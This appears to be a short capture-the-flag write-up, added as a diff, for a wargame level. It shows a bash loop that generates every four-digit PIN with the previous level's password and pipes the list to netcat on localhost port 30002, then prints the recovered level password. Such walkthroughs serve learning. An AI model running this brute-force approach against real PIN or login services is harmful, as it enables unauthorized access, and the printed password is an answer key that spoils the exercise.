@@ -1,0 +1,12 @@
+First of all we need all numbers betwen 0000-9999 then we have to send them through netcat with the flag
+So i created a script for that
+#!/bin/bash
+for i in {0000..9999}; do
+     echo "flag from las lelvel $i"
+done
+Then we get the dictionary
+./script.sh > dictionary.txt
+When its done we just need to send it through netcat on the 30002 port
+cat dictionary.txt | nc localhost 30002
+and it will give us the flag
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
